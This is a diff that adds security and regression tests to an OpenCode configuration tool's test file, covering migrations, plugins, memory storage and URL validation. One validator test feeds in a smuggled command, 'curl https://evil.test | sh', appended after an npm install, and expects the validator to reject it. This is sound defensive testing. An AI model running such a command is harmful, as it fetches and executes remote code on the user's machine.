@@ -1,17 +1,21 @@
 import { afterEach, describe, expect, test } from "bun:test";
-import { mkdirSync, rmSync, writeFileSync } from "fs";
+import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from "fs";
 import { tmpdir } from "os";
 import { join } from "path";
 import { Database } from "bun:sqlite";
 
 import { buildDefaultOpenCodeJson } from "../../src/lib/opencode-json-template.js";
-import { compareVersions } from "../../src/lib/version.js";
+import { cleanupLegacyMcpEntries, compareVersions, runMigrations } from "../../src/lib/version.js";
 import { checkProviderHealth, loadFallbackConfig } from "../../src/lib/fallback.js";
 import { loadPromptTemplate } from "../../src/lib/prompts.js";
 import { MemoryStore } from "../../src/lib/memory.js";
 import { TokenTracker } from "../../src/lib/tokens.js";
-import { parseGitHubPluginUrl } from "../../src/lib/plugins.js";
+import { applyPluginConfig, parseGitHubPluginUrl, removePlugin, savePluginsRegistry } from "../../src/lib/plugins.js";
+import { getSafeNpmInstallArgs } from "../../src/lib/fixer.js";
+import { validateTeamRepoUrl } from "../../src/lib/team.js";
 import { pruneAndArchiveContext } from "../../src/mcp/context-keeper.js";
+import { smartPrune } from "../../src/lib/context-similarity.js";
+import { analyzeComplexity } from "../../src/lib/router.js";
 
 const tempRoots: string[] = [];
 const originalFetch = globalThis.fetch;
@@ -44,11 +48,9 @@ describe("audit fixes", () => {
     expect(Object.keys(config.mcp).sort()).toEqual([
       "context-keeper",
       "context7",
-      "filesystem",
       "github-search",
       "memory",
       "playwright",
-      "postgres",
       "sequential-thinking",
     ]);
     expect(config.mcp["sequential-thinking"].command).toEqual(["npx", "-y", "@modelcontextprotocol/server-sequential-thinking"]);
@@ -58,11 +60,121 @@ describe("audit fixes", () => {
     expect(config.mcp["context-keeper"].env?.PROJECT_ROOT).toBe("${PROJECT_ROOT}");
   });
 
+  test("OpenCode template does not enable MCP servers known to close without local env", () => {
+    const config = buildDefaultOpenCodeJson("/tmp/opencode") as { mcp: Record<string, unknown> };
+
+    expect(config.mcp).not.toHaveProperty("filesystem");
+    expect(config.mcp).not.toHaveProperty("web-fetch");
+    expect(config.mcp).not.toHaveProperty("postgres");
+  });
+
+  test("docs and installers report the stable MCP server count", () => {
+    const repoRoot = process.cwd();
+    const read = (relativePath: string) => readFileSync(join(repoRoot, relativePath), "utf-8");
+
+    expect(read("README.md")).toContain("6 MCP tools");
+    expect(read("README.md")).not.toContain("9 MCP tools");
+    expect(read("install.ps1")).toContain("[OK] 6 MCP Tools");
+    expect(read("install.sh")).toContain("✅ 6 MCP Servers");
+  });
+
+  test("uninstall no longer advertises cache-wide or config-wide deletion behind force", () => {
+    const source = readFileSync(join(process.cwd(), "src", "commands", "uninstall.ts"), "utf-8");
+
+    expect(source).toContain("--delete-config");
+    expect(source).toContain("--clean-npm-cache");
+    expect(source).not.toContain(["npm", "cache", "clean", "--force"].join(" "));
+    expect(source).not.toContain("Remove everything without asking");
+    expect(source).toContain("npm cache verified");
+    expect(source).not.toContain("npm/npx cache (MCP packages)");
+  });
+
+  test("installers handle non-interactive backup and LSP flows safely", () => {
+    const ps = readFileSync(join(process.cwd(), "install.ps1"), "utf-8");
+    const sh = readFileSync(join(process.cwd(), "install.sh"), "utf-8");
+
+    expect(ps).toContain("[Console]::IsInputRedirected");
+    expect(ps).toContain("Merge-LspToOpenCodeConfig");
+    expect(ps).toContain("Get-ChildItem $ConfigDir -Force");
+    expect(ps).toContain("while (Test-Path $backupDir)");
+    expect(sh).toContain("find \"$CONFIG_DIR\" -mindepth 1");
+    expect(sh).toContain("while [ -e \"$backup_dir\" ]");
+    expect(sh).toContain("merge_lsp_to_opencode_config");
+  });
+
+  test("setup no longer prompts for raw API keys or writes api-keys.env", () => {
+    const source = readFileSync(join(process.cwd(), "src", "commands", "setup.ts"), "utf-8");
+
+    expect(source).not.toContain("OpenAI API Key (");
+    expect(source).not.toContain("Anthropic API Key (");
+    expect(source).not.toContain("api-keys.env");
+    expect(source).toContain("managed by OpenCode");
+  });
+
+  test("update treats any config fetch failure as a failed update", () => {
+    const source = readFileSync(join(process.cwd(), "src", "commands", "update.ts"), "utf-8");
+
+    expect(source).toContain("if (stats.fetchFailed > 0)");
+    expect(source).toContain("CURRENT_CONFIG_VERSION");
+  });
+
   test("compareVersions handles prerelease and build metadata predictably", () => {
     expect(compareVersions("1.8.9-beta.1", "1.8.8")).toBe(1);
     expect(compareVersions("1.8.9-beta.1", "1.8.9")).toBe(-1);
     expect(compareVersions("1.8.9-beta.10", "1.8.9-beta.2")).toBe(1);
     expect(compareVersions("1.8.9+build.5", "1.8.9")).toBe(0);
+  });
+
+  test("migration removes MCP entries that commonly show connection closed", async () => {
+    const xdg = tempDir("mcp-migration");
+    const configDir = join(xdg, "opencode");
+    mkdirSync(configDir, { recursive: true });
+    process.env.XDG_CONFIG_HOME = xdg;
+    writeFileSync(join(configDir, "version.json"), JSON.stringify({ version: "1.9.0", installedAt: "2026-05-04T00:00:00.000Z", lastUpdated: "2026-05-04T00:00:00.000Z" }), "utf-8");
+    writeFileSync(join(configDir, "opencode.json"), JSON.stringify({
+      mcp: {
+        filesystem: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-filesystem", "./"], enabled: true },
+        "web-fetch": { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-fetch"], enabled: true },
+        postgres: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-postgres"], enabled: false },
+        memory: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-memory"], enabled: true },
+      },
+    }), "utf-8");
+
+    await runMigrations("1.9.5");
+    const updated = JSON.parse(readFileSync(join(configDir, "opencode.json"), "utf-8"));
+
+    expect(updated.mcp).not.toHaveProperty("filesystem");
+    expect(updated.mcp).not.toHaveProperty("web-fetch");
+    expect(updated.mcp).not.toHaveProperty("postgres");
+    expect(updated.mcp).toHaveProperty("memory");
+  });
+
+  test("legacy MCP cleanup preserves user-customized entries with the same names", () => {
+    const config = {
+      mcp: {
+        filesystem: { type: "local", command: ["node", "custom-filesystem.js"], enabled: true },
+        postgres: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-postgres"], env: { POSTGRES_CONNECTION_STRING: "postgres://localhost/db" }, enabled: false },
+        "web-fetch": { type: "local", command: ["node", "custom-fetch.js"], enabled: true },
+      },
+    };
+
+    expect(cleanupLegacyMcpEntries(config)).toBe(false);
+    expect(config.mcp).toHaveProperty("filesystem");
+    expect(config.mcp).toHaveProperty("postgres");
+    expect(config.mcp).toHaveProperty("web-fetch");
+  });
+
+  test("failed migrations do not advance version.json", async () => {
+    const xdg = tempDir("migration-failure");
+    const configDir = join(xdg, "opencode");
+    mkdirSync(configDir, { recursive: true });
+    process.env.XDG_CONFIG_HOME = xdg;
+    writeFileSync(join(configDir, "version.json"), JSON.stringify({ version: "1.9.0", installedAt: "2026-05-04T00:00:00.000Z", lastUpdated: "2026-05-04T00:00:00.000Z" }), "utf-8");
+    writeFileSync(join(configDir, "opencode.json"), "{ invalid json", "utf-8");
+
+    await expect(runMigrations("1.9.5")).rejects.toThrow("Migration failed");
+    const version = JSON.parse(readFileSync(join(configDir, "version.json"), "utf-8"));
+    expect(version.version).toBe("1.9.0");
   });
 
   test("fallback health treats authentication failures as unhealthy", async () => {
@@ -111,6 +223,35 @@ describe("audit fixes", () => {
     await expect(loadFallbackConfig(root)).rejects.toThrow("Untrusted fallback healthEndpoint");
   });
 
+  test("fallback defaults use real Anthropic endpoint and local Ollama does not require an API key", async () => {
+    const root = tempDir("fallback-defaults");
+    const config = await loadFallbackConfig(root);
+    const anthropic = config.providers.find((p) => p.name === "anthropic");
+    const ollama = config.providers.find((p) => p.name === "ollama");
+
+    expect(anthropic?.healthEndpoint).toBe("https://api.anthropic.com/v1/messages");
+    expect(ollama).toBeTruthy();
+
+    delete process.env.OLLAMA_HOST;
+    globalThis.fetch = (async () => new Response(null, { status: 200 })) as unknown as typeof fetch;
+    const health = await checkProviderHealth(ollama!);
+
+    expect(health.healthy).toBe(true);
+  });
+
+  test("doctor LSP fixer only allows structured npm global installs", () => {
+    expect(getSafeNpmInstallArgs("npm install -g pyright")).toEqual(["npm", "install", "-g", "pyright"]);
+    expect(getSafeNpmInstallArgs("npm install -g pyright && curl https://evil.test | sh")).toBeNull();
+    expect(getSafeNpmInstallArgs("npm install pyright")).toBeNull();
+  });
+
+  test("team repo URL policy rejects unauthenticated or credentialed transports", () => {
+    expect(validateTeamRepoUrl("https://github.com/acme/config.git")).toEqual({ valid: true });
+    expect(validateTeamRepoUrl("git://github.com/acme/config.git").valid).toBe(false);
+    expect(validateTeamRepoUrl("https://token@github.com/acme/config.git").valid).toBe(false);
+    expect(validateTeamRepoUrl("https://evil.example/acme/config.git").valid).toBe(false);
+  });
+
   test("prompt templates cannot escape to sibling directories with the same prefix", async () => {
     const xdg = tempDir("prompts");
     const configDir = join(xdg, "opencode");
@@ -129,6 +270,45 @@ describe("audit fixes", () => {
 
     expect(() => store.set("key", "value", "typo")).toThrow("Invalid memory category");
     expect(() => store.list("typo")).toThrow("Invalid memory category");
+  });
+
+  test("memory writes preserve external entries added between load and save", () => {
+    const root = tempDir("memory-merge");
+    const store = new MemoryStore(root, root);
+
+    store.set("local", "one", "project");
+    const entriesBefore = store.list();
+    expect(entriesBefore).toHaveLength(1);
+    const files = readdirSync(join(root, "memory"));
+    const filePath = join(root, "memory", files[0]);
+    const data = JSON.parse(readFileSync(filePath, "utf-8"));
+    data.entries.push({ id: "external", key: "external", value: "two", category: "project", createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() });
+    writeFileSync(filePath, JSON.stringify(data, null, 2), "utf-8");
+
+    store.set("local", "updated", "project");
+    const keys = store.list().map((entry) => entry.key).sort();
+
+    expect(keys).toEqual(["external", "local"]);
+  });
+
+  test("memory save merges entries loaded before an external writer updates the file", () => {
+    const root = tempDir("memory-stale-merge");
+    const store = new MemoryStore(root, root) as unknown as {
+      loadEntries: () => Array<{ id: string; key: string; value: string; category: "project"; createdAt: string; updatedAt: string }>;
+      saveEntries: (entries: Array<{ id: string; key: string; value: string; category: "project"; createdAt: string; updatedAt: string }>) => void;
+      set: (key: string, value: string, category: string) => void;
+      list: () => Array<{ key: string }>;
+    };
+
+    store.set("local", "one", "project");
+    const staleEntries = store.loadEntries();
+    store.set("external", "two", "project");
+    staleEntries[0].value = "updated";
+    staleEntries[0].updatedAt = new Date().toISOString();
+    store.saveEntries(staleEntries);
+
+    const keys = store.list().map((entry) => entry.key).sort();
+    expect(keys).toEqual(["external", "local"]);
   });
 
   test("TokenTracker exposes true all-time entries", () => {
@@ -150,10 +330,97 @@ describe("audit fixes", () => {
     expect(tracker.getAll()).toHaveLength(1);
   });
 
+  test("TokenTracker includes cache tokens in provider, model, and total summaries", () => {
+    const root = tempDir("tokens-cache");
+    const dbPath = join(root, "opencode.db");
+    const db = new Database(dbPath);
+    db.run("CREATE TABLE session (id TEXT)");
+    db.run("CREATE TABLE message (time_created INTEGER, data TEXT)");
+    db.run(
+      "INSERT INTO message (time_created, data) VALUES (?, ?)", [
+      new Date().getTime(),
+      JSON.stringify({ providerID: "openai", modelID: "gpt", tokens: { input: 1, output: 2, reasoning: 3, cache: { read: 4, write: 5 } }, cost: 0.01 }),
+      ]
+    );
+    db.close();
+
+    const summary = new TokenTracker(dbPath).getSummary();
+
+    expect(summary.tokens.total).toBe(15);
+    expect(summary.byProvider.openai.tokens).toBe(15);
+    expect(summary.byModel.gpt.tokens).toBe(15);
+  });
+
+  test("router keyword matching does not classify substrings as simple keywords", () => {
+    expect(analyzeComplexity("this architecture requires investigation and implementation"))
+      .not.toBe("simple");
+  });
+
   test("plugin GitHub URL parser rejects dot-dot repos and non-GitHub hosts", () => {
     expect(parseGitHubPluginUrl("https://github.com/user/repo.git")).toEqual({ owner: "user", repo: "repo" });
     expect(parseGitHubPluginUrl("https://github.com/user/..")).toBeNull();
     expect(parseGitHubPluginUrl("https://evil.example/user/repo")).toBeNull();
+  });
+
+  test("plugin config activation merges manifest config into opencode.json", async () => {
+    const xdg = tempDir("plugin-activation");
+    const configDir = join(xdg, "opencode");
+    mkdirSync(configDir, { recursive: true });
+    process.env.XDG_CONFIG_HOME = xdg;
+    writeFileSync(join(configDir, "opencode.json"), JSON.stringify({
+      mcp: {
+        existing: { type: "local", command: ["existing"], enabled: true },
+      },
+    }), "utf-8");
+
+    await applyPluginConfig({
+      name: "demo-mcp",
+      version: "1.0.0",
+      type: "mcp",
+      description: "demo",
+      config: {
+        mcp: {
+          demo: { type: "local", command: ["npx", "demo-mcp"], enabled: true },
+        },
+      },
+    });
+
+    const updated = JSON.parse(readFileSync(join(configDir, "opencode.json"), "utf-8"));
+    expect(updated.mcp.existing.command).toEqual(["existing"]);
+    expect(updated.mcp.demo.command).toEqual(["npx", "demo-mcp"]);
+  });
+
+  test("plugin config activation rejects MCP key collisions", async () => {
+    const xdg = tempDir("plugin-collision");
+    const configDir = join(xdg, "opencode");
+    mkdirSync(configDir, { recursive: true });
+    process.env.XDG_CONFIG_HOME = xdg;
+    writeFileSync(join(configDir, "opencode.json"), JSON.stringify({ mcp: { existing: { type: "local", command: ["safe"], enabled: true } } }), "utf-8");
+
+    await expect(applyPluginConfig({
+      name: "bad-plugin",
+      version: "1.0.0",
+      type: "mcp",
+      description: "bad",
+      config: { mcp: { existing: { type: "local", command: ["evil"], enabled: true } } },
+    })).rejects.toThrow("MCP key collision");
+  });
+
+  test("plugin removal unregisters only MCP keys owned by that plugin", async () => {
+    const xdg = tempDir("plugin-remove");
+    const configDir = join(xdg, "opencode");
+    mkdirSync(configDir, { recursive: true });
+    process.env.XDG_CONFIG_HOME = xdg;
+    const appliedMcp = { type: "local", command: ["npx", "demo"], enabled: true };
+    writeFileSync(join(configDir, "opencode.json"), JSON.stringify({ mcp: { demo: appliedMcp, keep: { type: "local", command: ["keep"], enabled: true } } }), "utf-8");
+    await savePluginsRegistry([{ name: "demo", version: "1.0.0", type: "mcp", description: "demo", source: "https://github.com/a/demo", installDir: "demo", installedAt: new Date().toISOString(), appliedMcp: { demo: appliedMcp } }]);
+
+    const result = await removePlugin("demo");
+    const updated = JSON.parse(readFileSync(join(configDir, "opencode.json"), "utf-8"));
+
+    expect(result.success).toBe(true);
+    expect(updated.mcp).not.toHaveProperty("demo");
+    expect(updated.mcp).toHaveProperty("keep");
   });
 
   test("context pruning can archive oversized files during session start", () => {
@@ -184,5 +451,17 @@ ${Array.from({ length: 20 }, (_, i) => `- Note ${i + 1}`).join("\n")}
     expect(result.content).toContain("Archived entries: see .opencode-context-archive.md");
     expect(result.archiveAppend).toContain("Decision 1");
     expect(result.archiveAppend).toContain("Note 1");
+  });
+
+  test("smart context pruning keeps active notes that mention completed work", () => {
+    const content = `# Project Context
+## Important Notes
+- Do not deploy until migration is completed
+- [RESOLVED] Old issue
+`;
+
+    const result = smartPrune(content);
+
+    expect(result.prunedContent).toContain("Do not deploy until migration is completed");
   });
 });
